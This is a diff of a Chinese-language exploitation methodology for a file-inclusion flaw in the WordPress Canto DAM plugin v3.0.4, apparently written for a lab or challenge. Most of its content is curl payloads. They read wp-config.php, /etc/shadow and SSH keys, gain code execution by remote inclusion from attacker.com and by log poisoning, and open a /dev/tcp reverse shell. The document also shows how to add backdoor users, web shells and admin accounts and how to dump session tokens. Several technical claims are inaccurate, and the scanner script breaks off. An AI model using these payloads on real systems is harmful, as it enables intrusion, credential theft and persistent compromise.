@@ -1,406 +1,541 @@
-# WordPress Canto 插件 LFI 与认证绕过攻击方法论
+# WordPress Canto 插件 LFI 攻击
 
-## 1. 技术介绍
+## 1. 概述
 
-### 1.1 漏洞原理
+### 1.1 漏洞描述
 
-WordPress Canto DAM 插件 v3.0.4 的 6 个 PHP 库文件存在严重的本地文件包含（LFI）漏洞。这些文件接受用户可控的 `wp_abspath` 或 `abspath` 参数，直接将其拼接到 `require_once()` 语句中，导致攻击者可以包含任意文件。
-
-**漏洞本质：** 应用层代码将用户输入作为文件路径执行，违背了"不信任用户输入"的安全原则。
+WordPress Canto Digital Asset Management (DAM) 插件 v3.0.4 的 6 个 PHP 库文件存在严重的本地文件包含 (LFI) 漏洞。这些文件接受用户可控的 `wp_abspath` 和 `abspath` 参数，并将其直接用于 `require_once()` 语句，导致攻击者可以包含任意本地文件，结合 `allow_url_include=On` 配置可实现远程代码执行 (RCE)。
 
 ### 1.2 受影响组件
 
-| 文件路径 | 漏洞参数 | 危险代码行 | HTTP 方法 |
-|---------|---------|-----------|---------|
-| `/wp-content/plugins/canto/includes/lib/get.php` | `wp_abspath` | 第 5 行 | GET/POST |
-| `/wp-content/plugins/canto/includes/lib/download.php` | `wp_abspath` | 第 5 行 | GET/POST |
-| `/wp-content/plugins/canto/includes/lib/detail.php` | `wp_abspath` | 第 3 行 | GET/POST |
-| `/wp-content/plugins/canto/includes/lib/tree.php` | `wp_abspath` | 第 5 行 | GET/POST |
-| `/wp-content/plugins/canto/includes/lib/sizes.php` | `abspath` | 第 15, 18 行 | GET/POST |
-| `/wp-content/plugins/canto/includes/lib/copy-media.php` | `abspath` | 第 55, 58 行 | POST |
+| 文件路径 | 漏洞参数 | 代码位置 |
+|---------|---------|---------|
+| `/wp-content/plugins/canto/includes/lib/get.php` | `wp_abspath` | 第 5 行 |
+| `/wp-content/plugins/canto/includes/lib/download.php` | `wp_abspath` | 第 5 行 |
+| `/wp-content/plugins/canto/includes/lib/detail.php` | `wp_abspath` | 第 3 行 |
+| `/wp-content/plugins/canto/includes/lib/tree.php` | `wp_abspath` | 第 5 行 |
+| `/wp-content/plugins/canto/includes/lib/sizes.php` | `abspath` | 第 15、18 行 |
+| `/wp-content/plugins/canto/includes/lib/copy-media.php` | `abspath` | 第 55、58 行 |
 
-### 1.3 漏洞代码模式
+### 1.3 漏洞成因
 
+Canto 插件的库文件设计为直接通过 HTTP 访问，尝试动态加载 WordPress 核心文件。然而，WordPress 安装路径通过用户可控的请求参数传递，且仅经过 `sanitize_text_field()` 处理，未进行有效的路径验证或白名单检查。
+
+**脆弱代码模式：**
 ```php
-// 漏洞代码示例 (get.php 第 5 行)
+// 脆弱代码示例 (get.php 第 5 行)
 require_once($_REQUEST['wp_abspath'] . '/wp-admin/admin.php');
+```
 
-// 漏洞代码示例 (sizes.php 第 15, 18 行)
-require_once(urldecode($_REQUEST["abspath"]) . 'wp-admin/admin.php');
-require_once($_REQUEST["abspath"] . 'wp-admin/includes/image.php');
+### 1.4 前置条件
+
+- WordPress 6.5.4 安装 Canto DAM 插件 v3.0.4
+- PHP 配置 `allow_url_include=On`（启用远程文件包含）
+- Apache 2.4.41 服务器
+- 无需认证（6 个文件均可匿名访问）
+
+---
+
+## 2. 漏洞探测
+
+### 2.1 端点识别
+
+**目标端点列表：**
+```bash
+# 6 个存在 LFI 漏洞的端点
+GET/POST /wp-content/plugins/canto/includes/lib/get.php
+GET/POST /wp-content/plugins/canto/includes/lib/download.php
+GET/POST /wp-content/plugins/canto/includes/lib/detail.php
+GET/POST /wp-content/plugins/canto/includes/lib/tree.php
+GET/POST /wp-content/plugins/canto/includes/lib/sizes.php
+POST    /wp-content/plugins/canto/includes/lib/copy-media.php
+```
+
+**端点发现方法：**
+```bash
+# 目录扫描发现
+gobuster dir -u http://target/wp-content/plugins/canto/includes/lib/ \
+  -w /usr/share/wordlists/dirb/common.txt
+
+# 或直接访问已知端点测试
+curl -I http://target/wp-content/plugins/canto/includes/lib/get.php
+```
+
+### 2.2 LFI 漏洞验证
+
+**基础测试 Payload：**
+```bash
+# 测试 get.php 的 wp_abspath 参数
+curl -s "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=/etc"
+
+# 预期响应：PHP 警告或错误，表明路径被使用
+# 如果返回 500 错误，说明 require_once 尝试加载了无效路径
+
+# 测试有效 WordPress 路径
+curl -s "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=/var/www/html"
+# 如果 WordPress 正确加载，将重定向到登录页面
+```
+
+**路径遍历测试：**
+```bash
+# 使用../进行路径遍历
+curl -s "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=../../../../etc"
+
+# URL 编码遍历
+curl -s "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc"
+
+# 双 URL 编码（绕过某些 WAF）
+curl -s "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=%252e%252e%252f"
+```
+
+### 2.3 文件存在性验证
+
+**验证敏感文件可读：**
+```bash
+# 测试读取/etc/passwd
+curl -s "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=/etc/passwd%00"
+
+# 使用 null 字节截断（PHP<5.3.4）
+# 如果返回 passwd 文件内容，说明 LFI 可利用
+
+# 测试读取 WordPress 配置文件
+curl -s "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=/var/www/html/wp-config%00"
 ```
 
 ---
 
-## 2. 攻击场景
+## 3. 漏洞利用方法
 
-### 2.1 直接文件读取
+### 3.1 本地文件读取
 
-| 业务场景 | 功能示例 | 风险点描述 |
-|---------|---------|-----------|
-| **配置文件读取** | 读取 wp-config.php | 获取数据库凭证、盐值、密钥 |
-| **源码泄露** | 读取插件/主题 PHP 文件 | 获取业务逻辑、硬编码密钥 |
-| **日志文件读取** | 读取 Apache/Nginx 日志 | 结合日志注入实现 RCE |
-| **系统文件读取** | 读取 /etc/passwd | 获取系统用户信息 |
-
-### 2.2 远程文件包含（RFI）
-
-当 `allow_url_include=On` 时：
-
-| 业务场景 | 功能示例 | 风险点描述 |
-|---------|---------|-----------|
-| **远程代码执行** | 包含攻击者控制的 PHP 文件 | 执行任意 PHP 代码 |
-| **Webshell 上传** | 包含远程 shell.php | 建立持久化后门 |
-| **反向 Shell** | 包含反向 Shell 脚本 | 获取服务器控制权 |
-
----
-
-## 3. 漏洞探测方法
-
-### 3.1 黑盒测试
-
-#### 3.1.1 基础 LFI 探测
-
+**读取系统敏感文件：**
 ```bash
-# 测试基本 LFI 功能
-curl -i "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=/var/www/html"
+# 读取/etc/passwd（用户枚举）
+curl -s "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=/etc/passwd%00"
 
-# 如果返回 WordPress 管理页面内容，说明 LFI 成功
+# 读取/proc/self/environ（环境变量）
+curl -s "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=/proc/self/environ%00"
+
+# 读取 Apache 日志（需要知道路径）
+curl -s "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=/var/log/apache2/access.log%00"
+
+# 读取 SSH 密钥
+curl -s "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=/root/.ssh/id_rsa%00"
 ```
 
-#### 3.1.2 路径遍历探测
-
+**读取 WordPress 敏感文件：**
 ```bash
-# 测试路径遍历
-curl -i "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=../../../../../../etc"
+# 读取 wp-config.php（数据库凭证）
+curl -s "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=/var/www/html/wp-config.php%00"
 
-# 测试绝对路径
-curl -i "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=/etc/passwd%00"
-```
-
-#### 3.1.3 远程文件包含探测
-
-```bash
-# 测试 RFI（需要 allow_url_include=On）
-curl -i "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=http://attacker.com/shell.txt?"
-
-# 注意：? 用于截断后面的 .php 扩展名
-```
-
-### 3.2 白盒测试
-
-#### 3.2.1 代码审计
-
-```bash
-# 搜索 require_once 与用户输入的组合
-grep -rn "require_once.*\$_REQUEST\[" wp-content/plugins/canto/
-grep -rn "require_once.*\$_GET\[" wp-content/plugins/canto/
-grep -rn "require_once.*\$_POST\[" wp-content/plugins/canto/
-
-# 搜索 include/require 与用户输入的组合
-grep -rn "include.*\$_" wp-content/plugins/canto/
-grep -rn "require.*\$_" wp-content/plugins/canto/
-```
-
----
-
-## 4. 漏洞利用方法
-
-### 4.1 敏感文件读取
-
-#### 4.1.1 WordPress 配置文件
-
-```bash
-# 读取 wp-config.php 获取数据库凭证
-curl "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=/var/www/html&subdomain=test&app_api=example.com&token=x"
-
-# 响应包含：
+# 预期输出包含：
 # define('DB_NAME', 'wordpress');
 # define('DB_USER', 'wp_user');
 # define('DB_PASSWORD', 'ThisIsNotPartOfTheChallenge!');
 # define('DB_HOST', '127.0.0.1');
 ```
 
-#### 4.1.2 系统文件读取
+### 3.2 远程文件包含 (RFI) → RCE
 
-```bash
-# 读取 /etc/passwd
-curl "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=/etc/passwd%00&subdomain=test&app_api=x&token=x"
+**前提条件：** PHP `allow_url_include=On`
 
-# 读取 /etc/shadow（需要 root 权限）
-curl "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=/etc/shadow%00&subdomain=test&app_api=x&token=x"
+**利用步骤：**
 
-# 读取 Apache 日志
-curl "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=/var/log/apache2/access.log%00&subdomain=test&app_api=x&token=x"
-```
-
-#### 4.1.3 源码泄露
-
-```bash
-# 读取 Canto 插件源码
-curl "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=/var/www/html/wp-content/plugins/canto/includes/class-canto-settings.php&subdomain=test&app_api=x&token=x"
-
-# 读取 WordPress 核心文件
-curl "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=/var/www/html/wp-includes/pluggable.php&subdomain=test&app_api=x&token=x"
-```
-
-### 4.2 远程代码执行
-
-#### 4.2.1 日志注入 + LFI
-
-```bash
-# 步骤 1：在 Apache 日志中注入 PHP 代码
-curl -A "<?php system(\$_GET['cmd']); ?>" "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=test&subdomain=x&app_api=y&token=z"
-
-# 步骤 2：通过 LFI 包含日志文件执行代码
-curl "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=/var/log/apache2/access.log%00&subdomain=x&app_api=y&token=z&cmd=id"
-```
-
-#### 4.2.2 远程文件包含 RCE
-
-```bash
-# 步骤 1：在攻击者服务器上创建恶意 PHP 文件
-# attacker.com/shell.txt 内容：
-<?php system($_GET['cmd']); ?>
-
-# 步骤 2：通过 RFI 执行代码（需要 allow_url_include=On）
-curl "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=http://attacker.com/shell.txt?&subdomain=x&app_api=y&token=z&cmd=id"
-```
-
-#### 4.2.3 数据驱动 RCE（copy-media.php）
-
-```bash
-# copy-media.php 包含多阶段 SSRF 链，可写入文件到服务器
-curl -X POST "http://target/wp-content/plugins/canto/includes/lib/copy-media.php" \
-  -d "abspath=/var/www/html&fbc_flight_domain=attacker&fbc_app_api=.com&fbc_scheme=api&fbc_id=v1&fbc_app_token=test&post_id=1"
-
-# 攻击者服务器返回恶意 JSON，包含内网 URL
-# {
-#   "url": {
-#     "download": "http://attacker.com/malicious.php"
-#   }
-# }
-
-# 文件被下载并上传到 WordPress 媒体库
-```
-
-### 4.3 认证绕过
-
-#### 4.3.1 空字节注入绕过
-
-```bash
-# 使用%00 截断后面的路径
-curl "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=/var/www/html%00&subdomain=x&app_api=y&token=z"
-
-# 在 PHP < 5.3.4 版本有效
-```
-
-#### 4.3.2 路径遍历绕过
-
-```bash
-# 使用相对路径遍历
-curl "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=../../../../../../tmp&subdomain=x&app_api=y&token=z"
-
-# 如果 /tmp 存在恶意 PHP 文件，可被包含执行
-```
-
----
-
-## 5. 绕过方法
-
-### 5.1 绕过文件扩展名限制
-
-#### 5.1.1 空字节截断
-
-```bash
-# PHP < 5.3.4 支持%00 截断
-wp_abspath=/var/www/html/shell.php%00
-
-# 实际执行：require_once("/var/www/html/shell.php")
-```
-
-#### 5.1.2 问号截断
-
-```bash
-# 使用？截断后面的扩展名
-wp_abspath=http://attacker.com/shell.txt?
-
-# 实际执行：require_once("http://attacker.com/shell.txt?.php")
-# PHP 忽略？后面的内容
-```
-
-### 5.2 绕过路径过滤
-
-#### 5.2.1 双 URL 编码
-
-```bash
-# 双 URL 编码绕过路径检查
-wp_abspath=%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
-
-# 解码后：/../../../etc/passwd
-```
-
-#### 5.2.2 混合路径表示
-
-```bash
-# 使用 Windows 风格路径
-wp_abspath=C:\..\..\..\..\..\..\..\..\..\..\etc\passwd
-
-# 使用混合斜杠
-wp_abspath=/var\\www\\html/../../../etc/passwd
-```
-
-### 5.3 结合其他漏洞
-
-#### 5.3.1 LFI + XSS 链
-
-```
-1. 通过 LFI 读取 WordPress 数据库凭证
-2. 连接数据库获取管理员会话 token
-3. 使用管理员权限注入 XSS payload
-4. 窃取其他用户会话
-```
-
-#### 5.3.2 LFI + SSRF 链
-
-```
-1. 通过 SSRF 读取内网服务响应
-2. 响应包含文件路径信息
-3. 使用 LFI 读取该文件
-4. 获取敏感数据
-```
-
----
-
-## 6. 渗透测试决策流程
-
-```
-开始 LFI 测试
-    │
-    ▼
-识别文件包含点
-    │
-    ├── 参数名为 path/file/include/abspath
-    ├── 参数参与 require/include 调用
-    └── 响应包含文件内容
-    │
-    ▼
-验证 LFI 存在性
-    │
-    ├── 包含已知文件（/etc/passwd）
-    ├── 包含自身文件（检测递归）
-    └── 分析错误消息
-    │
-    ▼
-确定 LFI 类型
-    │
-    ├── 本地文件包含
-    │   ├── 读取敏感文件
-    │   ├── 日志注入
-    │   └── 结合其他漏洞
-    │
-    └── 远程文件包含（allow_url_include=On）
-        ├── 远程代码执行
-        ├── Webshell 上传
-        └── 反向 Shell
-    │
-    ▼
-深度利用
-    │
-    ├── 读取数据库凭证
-    ├── 读取会话 token
-    ├── 读取源码
-    └── 实现 RCE
-```
-
----
-
-## 7. 常用 Payload 速查表
-
-| 类别 | 目标/环境 | Payload 示例 | 说明 |
-|-----|---------|------------|------|
-| **基础 LFI** | Linux 系统 | `wp_abspath=/etc/passwd%00` | 读取 /etc/passwd |
-| **基础 LFI** | WordPress | `wp_abspath=/var/www/html/wp-config.php` | 读取数据库配置 |
-| **基础 LFI** | Apache 日志 | `wp_abspath=/var/log/apache2/access.log%00` | 读取日志文件 |
-| **RFI** | 远程 Shell | `wp_abspath=http://attacker.com/shell.txt?` | 需要 allow_url_include=On |
-| **路径遍历** | 相对路径 | `wp_abspath=../../../../../../etc/passwd` | 遍历到根目录 |
-| **空字节截断** | PHP < 5.3.4 | `wp_abspath=/etc/passwd%00` | 截断扩展名 |
-| **日志注入** | Apache | User-Agent: `<?php system($_GET['cmd']); ?>` | 注入 PHP 代码 |
-| **编码绕过** | 双 URL 编码 | `wp_abspath=%252f%252e%252e%252fetc%252fpasswd` | 绕过过滤 |
-
----
-
-## 8. WordPress 特定场景
-
-### 8.1 结合 WordPress 认证机制
-
-```bash
-# 1. 通过 LFI 读取 wp-config.php 获取数据库凭证
-curl "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=/var/www/html/wp-config.php&subdomain=x&app_api=y&token=z"
-
-# 2. 使用凭证连接 MySQL 数据库
-mysql -h 127.0.0.1 -u wp_user -p'ThisIsNotPartOfTheChallenge!' wordpress
-
-# 3. 查询管理员会话 token
-SELECT meta_value FROM wp_usermeta WHERE meta_key = 'session_tokens';
-
-# 4. 构造认证 Cookie
-# wordpress_logged_in_[hash]=admin|expiration|token|hmac
-```
-
-### 8.2 结合 WordPress 插件架构
-
-```bash
-# Canto 插件直接文件访问绕过 WordPress 路由
-# 正常 WordPress 插件应通过 admin-ajax.php 或 REST API 访问
-# Canto 插件允许直接访问 PHP 文件
-
-# 攻击路径：
-# 1. 直接访问 /wp-content/plugins/canto/includes/lib/get.php
-# 2. 提供 wp_abspath 参数包含 WordPress 核心
-# 3. 绕过 WordPress 认证检查
-# 4. 执行任意操作
-```
-
----
-
-## 9. 防御建议
-
-### 9.1 代码层修复
-
+**步骤 1：准备恶意 PHP 文件**
 ```php
-// 使用 ABSPATH 常量代替用户输入
-require_once(ABSPATH . 'wp-admin/admin.php');
-
-// 如果必须使用用户输入，进行严格验证
-$allowed_paths = ['/var/www/html', '/usr/share/wordpress'];
-$user_path = realpath($_REQUEST['wp_abspath']);
-
-$is_allowed = false;
-foreach ($allowed_paths as $allowed) {
-    if (strpos($user_path, $allowed) === 0) {
-        $is_allowed = true;
-        break;
-    }
-}
-
-if (!$is_allowed) {
-    wp_die('Invalid path');
-}
+// attacker.com/shell.php
+<?php
+    system($_GET['cmd']);
+?>
 ```
 
-### 9.2 配置层修复
+**步骤 2：通过 RFI 执行远程代码**
+```bash
+# 包含远程恶意文件
+curl -s "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=http://attacker.com/shell.php?"
 
+# 执行命令
+curl -s "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=http://attacker.com/shell.php?cmd=id"
+
+# 预期输出：uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+**步骤 3：建立反向 Shell**
+```bash
+# 攻击者监听
+nc -lvnp 4444
+
+# 触发反向 Shell
+curl -s "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=http://attacker.com/shell.php?cmd=bash+-i+%3E%26+%2Fdev%2Ftcp%2Fattacker.com%2F4444+0%3E%261"
+```
+
+### 3.3 日志注入 → RCE
+
+**当 `allow_url_include=Off` 时的替代方案：**
+
+**步骤 1：注入 PHP Payload 到日志**
+```bash
+# 通过 User-Agent 注入 PHP 代码到 Apache 日志
+curl -s "http://target/wp-content/plugins/canto/includes/lib/get.php" \
+  -A "<?php system(\$_GET['cmd']); ?>"
+
+# 日志路径通常为：/var/log/apache2/access.log 或 /var/log/httpd/access_log
+```
+
+**步骤 2：通过 LFI 包含日志文件**
+```bash
+# 包含 Apache 日志执行代码
+curl -s "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=/var/log/apache2/access.log%00&cmd=id"
+
+# 如果 Apache 日志路径未知，尝试以下路径：
+# /var/log/apache2/access.log
+# /var/log/apache/access.log
+# /var/log/httpd/access_log
+# /var/log/httpd/error_log
+# /usr/local/apache/log/access_log
+# /usr/local/apache2/log/access_log
+```
+
+### 3.4 PHP 输入流利用
+
+**使用 `php://input` 执行代码：**
+```bash
+# 通过 POST 发送 PHP 代码，使用 php://input 包含
+curl -s -X POST "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=php://input" \
+  -d "<?php system(\$_GET['cmd']); ?>"
+
+# 执行命令
+curl -s "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=php://input&cmd=id" \
+  -d "<?php system(\$_GET['cmd']); ?>"
+```
+
+**使用 `php://filter` 读取文件：**
+```bash
+# 使用 base64 编码读取文件（避免二进制问题）
+curl -s "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=php://filter/convert.base64-encode/resource=/var/www/html/wp-config.php%00"
+
+# 解码输出
+echo "<base64_output>" | base64 -d
+```
+
+### 3.5 数据期望利用
+
+**利用 `expect://` 流执行命令（需要启用）：**
+```bash
+# 如果 PHP 编译时启用了 --with-expect
+curl -s "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=expect://id"
+
+# 执行复杂命令
+curl -s "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=expect://cat%20/etc/passwd"
+```
+
+---
+
+## 4. 绕过技术
+
+### 4.1 路径遍历保护绕过
+
+**绕过 `..` 过滤：**
+```bash
+# 使用 URL 编码
+curl -s "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=%2e%2e%2f"
+
+# 使用双 URL 编码
+curl -s "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=%252e%252e%252f"
+
+# 使用 Unicode 编码
+curl -s "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=%c0%ae%c0%ae%c0%af"
+
+# 使用 UTF-8 长编码
+curl -s "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=%c0%2e%c0%2e%c0%2f"
+```
+
+**绕过路径前缀检查：**
+```bash
+# 如果应用检查路径必须以/var/www 开头
+# 使用符号链接绕过
+curl -s "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=/var/www/html/../../../../etc/passwd%00"
+
+# 使用绝对路径
+curl -s "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=/etc/passwd"
+```
+
+### 4.2 Null 字节注入
+
+**PHP<5.3.4 的 Null 字节截断：**
+```bash
+# 在路径末尾添加%00 截断自动添加的.php 扩展
+curl -s "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=/etc/passwd%00"
+
+# 如果应用自动添加.php，使用 null 字节绕过
+# 原始：require_once($_REQUEST['wp_abspath'] . '.php')
+# Payload: /etc/passwd%00  → require_once('/etc/passwd\0.php')
+```
+
+### 4.3 大小写绕过（Windows）
+
+**Windows 路径大小写不敏感：**
+```bash
+# 如果过滤了/etc/passwd
+curl -s "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=/ETC/PASSWD%00"
+
+# 混合大小写
+curl -s "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=/EtC/pAsSwD%00"
+```
+
+### 4.4 特殊协议利用
+
+**使用 `file://` 协议：**
+```bash
+# 读取本地文件
+curl -s "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=file:///etc/passwd%00"
+
+# 读取 Windows 文件
+curl -s "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=file://c:/windows/win.ini%00"
+```
+
+**使用 `data://` 协议执行代码：**
+```bash
+# 执行 PHP 代码
+curl -s "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=data://text/plain,<?php system('id');?>"
+
+# Base64 编码版本
+curl -s "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4="
+```
+
+---
+
+## 5. 后渗透利用
+
+### 5.1 信息收集
+
+**系统信息：**
+```bash
+# 操作系统信息
+curl -s "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=http://attacker.com/shell.php?cmd=uname+-a"
+
+# 当前用户
+curl -s "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=http://attacker.com/shell.php?cmd=whoami"
+
+# 环境变量
+curl -s "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=http://attacker.com/shell.php?cmd=env"
+
+# 网络配置
+curl -s "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=http://attacker.com/shell.php?cmd=ifconfig"
+```
+
+**WordPress 信息：**
+```bash
+# 读取 wp-config.php 获取数据库凭证
+curl -s "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=/var/www/html/wp-config.php%00"
+
+# 预期输出：
+# define('DB_NAME', 'wordpress');
+# define('DB_USER', 'wp_user');
+# define('DB_PASSWORD', 'ThisIsNotPartOfTheChallenge!');
+# define('DB_HOST', '127.0.0.1');
+# define('AUTH_KEY', '...');
+# define('SECURE_AUTH_KEY', '...');
+```
+
+### 5.2 权限提升
+
+**查找 SUID 二进制：**
+```bash
+curl -s "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=http://attacker.com/shell.php?cmd=find+/+-perm+-4000+-type+f+2>/dev/null"
+```
+
+**检查 sudo 权限：**
+```bash
+curl -s "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=http://attacker.com/shell.php?cmd=sudo+-l"
+```
+
+**读取敏感配置文件：**
+```bash
+# /etc/shadow（需要 root 权限）
+curl -s "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=http://attacker.com/shell.php?cmd=cat+/etc/shadow"
+
+# /root/.ssh/id_rsa
+curl -s "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=http://attacker.com/shell.php?cmd=cat+/root/.ssh/id_rsa"
+```
+
+### 5.3 持久化
+
+**创建后门用户：**
+```bash
+curl -s "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=http://attacker.com/shell.php?cmd=useradd+-m+-s+/bin/bash+-G+sudo+backdoor"
+curl -s "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=http://attacker.com/shell.php?cmd=echo+'backdoor:P@ssw0rd123'|chpasswd"
+```
+
+**安装 Web Shell：**
+```bash
+# 在 WordPress 目录创建持久化 Web Shell
+curl -s "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=http://attacker.com/shell.php?cmd=echo+'<?php+system(\$_GET[cmd]);?>'>+/var/www/html/wp-content/uploads/shell.php"
+```
+
+**修改 WordPress 用户：**
+```bash
+# 使用 WP-CLI 创建管理员账户（如果可用）
+curl -s "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=http://attacker.com/shell.php?cmd=wp+user+create+backdoor+backdoor@example.com+--role=administrator+--user_pass=P@ssw0rd123"
+```
+
+### 5.4 数据库访问
+
+**使用提取的凭证连接 MySQL：**
+```bash
+# 连接数据库
+curl -s "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=http://attacker.com/shell.php?cmd=mysql+-u+wp_user+-p'ThisIsNotPartOfTheChallenge!'+wordpress+-e+'SELECT+*+FROM+wp_users'"
+
+# 导出所有用户数据
+curl -s "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=http://attacker.com/shell.php?cmd=mysql+-u+wp_user+-p'ThisIsNotPartOfTheChallenge!'+wordpress+-e+'SELECT+user_login,user_email+FROM+wp_users'+>/tmp/users.txt"
+```
+
+**提取 WordPress 会话令牌：**
+```bash
+# 提取所有活动会话
+curl -s "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=http://attacker.com/shell.php?cmd=mysql+-u+wp_user+-p'ThisIsNotPartOfTheChallenge!'+wordpress+-e+'SELECT+meta_value+FROM+wp_usermeta+WHERE+meta_key=\"session_tokens\"'"
+```
+
+---
+
+## 6. 组合攻击场景
+
+### 6.1 LFI + SSRF 组合攻击
+
+**场景：** 使用 LFI 读取内部网络配置，然后使用 SSRF 访问内部服务
+
+**步骤 1：通过 LFI 读取网络配置**
+```bash
+# 读取/etc/hosts 获取内部主机信息
+curl -s "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=/etc/hosts%00"
+
+# 读取网络配置
+curl -s "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=/etc/network/interfaces%00"
+```
+
+**步骤 2：使用 SSRF 访问内部服务**
+```bash
+# 使用从 LFI 获取的信息构造 SSRF 请求
+curl -s "http://target/wp-content/plugins/canto/includes/lib/get.php?subdomain=192.168.1&app_api=100:8080&wp_abspath=/var/www/html&token=test"
+```
+
+### 6.2 LFI + 认证绕过组合攻击
+
+**场景：** 使用 LFI 读取会话令牌，然后劫持管理员会话
+
+**步骤 1：读取数据库中的会话令牌**
+```bash
+# 通过 MySQL 命令提取会话
+curl -s "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=http://attacker.com/shell.php?cmd=mysql+-u+wp_user+-p'PASSWORD'+wordpress+-N+-e+'SELECT+meta_value+FROM+wp_usermeta+WHERE+user_id=1+AND+meta_key=\"wp_capabilities\"'"
+```
+
+**步骤 2：使用窃取的会话访问管理界面**
+```bash
+# 使用窃取的会话 Cookie 访问管理界面
+curl -s "http://target/wp-admin/" \
+  -H "Cookie: wordpress_logged_in_[hash]=[stolen_token]"
+```
+
+### 6.3 LFI + XSS 组合攻击
+
+**场景：** 使用 LFI 读取敏感信息，然后通过 XSS 外带数据
+
+**步骤 1：通过 LFI 读取数据库凭证**
+```bash
+curl -s "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=/var/www/html/wp-config.php%00"
+```
+
+**步骤 2：将凭证注入到页面中**
+```bash
+# 将凭证写入可被 XSS 读取的位置
+curl -s "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=http://attacker.com/shell.php?cmd=echo+'<div+id=\"creds\">DB_PASS=secret</div>'>>/var/www/html/index.php"
+```
+
+---
+
+## 7. 自动化工具
+
+### 7.1 使用 Nikto 扫描
+
+```bash
+nikto -h http://target/wp-content/plugins/canto/includes/lib/ \
+  -Tuning 1 2 3 4 5
+```
+
+### 7.2 使用 LFISuite
+
+```bash
+# 自动化 LFI 扫描和利用
+python3 lfisuite.py --auto http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=
+```
+
+### 7.3 自定义扫描脚本
+
+```python
+#!/usr/bin/env python3
+import requests
+
+target = "http://target/wp-content/plugins/canto/includes/lib/"
+vulnerable_files = ["get.php", "download.php", "detail.php", "tree.php", "sizes.php", "copy-media.php"]
+test_paths = ["/etc/passwd", "/etc/passwd%00", "/var/www/html/wp-config.php", "php://input"]
+
+for file in vulnerable_files:
+    for path in test_paths:
+        url = f"{target}{file}?wp_abspath={path}"
+        try:
+            response = requests.get(url, timeout=5)
+            if "root:" in response.text or "DB_PASSWORD" in response.text:
